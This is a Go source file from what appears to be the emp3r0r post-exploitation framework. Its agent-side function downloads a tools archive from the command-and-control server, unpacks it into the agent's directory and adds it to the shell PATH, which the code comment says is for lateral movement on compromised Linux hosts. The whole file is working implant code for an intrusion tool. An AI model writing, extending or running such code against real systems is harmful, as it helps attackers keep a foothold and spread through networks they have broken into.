package agent

// build +linux

/*
install tools to emp3r0r_data.UtilsPath, for lateral movement
*/

import (
	"fmt"
	"log"
	"os"
	"strings"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver"
)

func VaccineHandler() (out string) {
	log.Printf("Downloading utils from %s", emp3r0r_data.CCAddress+"www/utils.tar.bz2")
	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/utils.tar.bz2", emp3r0r_data.AgentRoot+"/utils.tar.bz2")
	out = "[+] Utils have been successfully installed"
	if err != nil {
		log.Print("Utils error: " + err.Error())
		out = "[-] Download error: " + err.Error()
		return
	}

	// unpack utils.tar.bz2 to our PATH
	os.RemoveAll(emp3r0r_data.UtilsPath) // archiver fucking aborts when files already exist
	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
		if err = os.MkdirAll(emp3r0r_data.UtilsPath, 0700); err != nil {
			log.Print(err)
			return fmt.Sprintf("mkdir: %v", err)
		}
	}

	if err = archiver.Unarchive(emp3r0r_data.AgentRoot+"/utils.tar.bz2", emp3r0r_data.UtilsPath); err != nil {
		log.Printf("Unarchive: %v", err)
		return fmt.Sprintf("Unarchive: %v", err)
	}
	_ = os.Remove(emp3r0r_data.AgentRoot + "/utils.tar.bz2")

	// update PATH in .bashrc
	exportPATH := fmt.Sprintf("export PATH=%s:$PATH", emp3r0r_data.UtilsPath)
	if !strings.Contains(exportPATH, emp3r0r_data.BashRC) {
		emp3r0r_data.BashRC += "\n" + exportPATH
		// extract bash please
		err = ExtractBash()
		if err != nil {
			log.Printf("[-] Cannot extract bash: %v", err)
		}
		if !util.IsFileExist(emp3r0r_data.DefaultShell) {
			emp3r0r_data.DefaultShell = "/bin/sh"
		}
	}
	return
}
